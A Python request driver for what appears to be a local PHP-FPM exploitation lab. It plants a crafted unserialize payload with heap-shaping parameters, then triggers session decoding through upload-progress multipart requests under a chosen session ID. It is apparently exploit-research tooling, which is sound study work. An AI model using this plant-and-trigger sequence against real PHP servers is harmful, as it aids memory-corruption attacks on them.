#!/usr/bin/env python3
"""Request driver for the per-version zif_passthru session-decode lab."""
import hashlib, json, os, sys, time

LAB = os.environ.get('LAB', os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
PORT = int(os.environ['PORT'])
sys.path.insert(0, os.path.join(LAB, 'scripts'))
import fcgi

DOCROOT = os.path.join(LAB, 'www')
REQ = os.path.join(LAB, 'req')
COUNT = os.path.join(REQ, 'count.txt')
MAXREQ = 300
BOUNDARY = b'----fpmgadgetboundary7MA4YWxkTrZu0gW'
CTYPE = 'multipart/form-data; boundary=' + BOUNDARY.decode()
PLANT_PAYLOAD = os.environ.get('PLANT_PAYLOAD', 'a:2:{i:0;s:3:"aaa";i:0;s:3:"bbb";}X')


def bump():
    n = int(open(COUNT).read().strip()) if os.path.exists(COUNT) else 0
    n += 1
    if n > MAXREQ:
        raise SystemExit('request budget exhausted (%d)' % MAXREQ)
    open(COUNT, 'w').write('%d\n' % n)
    return n


def multipart_body(progress=b'prog', file_len=16):
    out = bytearray()
    out += b'--' + BOUNDARY + b'\r\n'
    out += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    out += progress + b'\r\n'
    out += b'--' + BOUNDARY + b'\r\n'
    out += b'Content-Disposition: form-data; name="f"; filename="f.bin"\r\n'
    out += b'Content-Type: application/octet-stream\r\n\r\n'
    out += b'x' * file_len + b'\r\n'
    out += b'--' + BOUNDARY + b'--\r\n'
    return bytes(out)


def one(kind, label, script, body, ctype, cookie=None, extra=None, timeout=30):
    n = bump()
    tag = '%02d_%s_%s' % (n, kind, label)
    dst = os.path.join(REQ, tag)
    os.makedirs(dst, exist_ok=True)
    t0 = time.time()
    err = None
    try:
        r = fcgi.request(script, body, ctype, cookie=cookie, timeout=timeout)
        stdout, stderr, status = r['stdout'], r['stderr'], r.get('status', '')
    except Exception as e:
        stdout, stderr, status = b'', b'', ''
        err = '%s: %s' % (type(e).__name__, e)
    elapsed = time.time() - t0
    meta = {'n': n, 'kind': kind, 'label': label, 'script': script,
            'body_len': len(body), 'body_sha256': hashlib.sha256(body).hexdigest(),
            'ctype': ctype, 'cookie': cookie, 'elapsed': round(elapsed, 4),
            'status': status, 'error': err,
            'stdout': stdout.decode('latin1'), 'stderr': stderr.decode('latin1')}
    if extra:
        meta.update(extra)
    open(os.path.join(dst, 'meta.json'), 'w').write(json.dumps(meta, indent=1))
    open(os.path.join(dst, 'body.bin'), 'wb').write(body)
    open(os.path.join(dst, 'stdout.bin'), 'wb').write(stdout)
    open(os.path.join(dst, 'stderr.bin'), 'wb').write(stderr)
    open(os.path.join(REQ, 'requests.log'), 'a').write(
        '%02d %-9s %-22s status=%-14r err=%r elapsed=%.2f stdout=%r stderr=%r\n' % (
            n, kind, label, status, err, elapsed,
            stdout.decode('latin1')[:300], stderr.decode('latin1')[:200]))
    print(json.dumps({k: meta[k] for k in ('n', 'kind', 'label', 'status', 'error',
                                           'elapsed', 'stdout', 'stderr')}, indent=1))
    return meta


def main():
    if len(sys.argv) < 2:
        raise SystemExit('usage: drv.py probe|plant|calib|trigger|count ...')
    fcgi.init(DOCROOT, port=PORT)
    cmd = sys.argv[1]
    if cmd == 'count':
        print(open(COUNT).read().strip() if os.path.exists(COUNT) else 0)
        return
    if cmd == 'probe':
        one('probe', 'liveness', 'probe.php', b'', 'application/x-www-form-urlencoded')
        return
    if cmd == 'plant':
        pad = sys.argv[2] if len(sys.argv) > 2 else '0'
        shape = sys.argv[3] if len(sys.argv) > 3 else '0'
        kfree = sys.argv[4] if len(sys.argv) > 4 else '0'
        body = ('p=%s&pad=%s&shape=%s&kfree=%s' % (PLANT_PAYLOAD, pad, shape, kfree)).encode()
        one('plant', 'user_error', 'unser.php', body,
            'application/x-www-form-urlencoded',
            extra={'payload': PLANT_PAYLOAD, 'pad': int(pad), 'shape': int(shape),
                   'kfree': int(kfree)})
        return
    if cmd in ('calib', 'trigger'):
        sid = sys.argv[2]
        body = multipart_body()
        meta = one(cmd, sid, 'probe.php', body, CTYPE, cookie='PHPSESSID=' + sid)
        return
    raise SystemExit('unknown command ' + cmd)


if __name__ == '__main__':
    main()
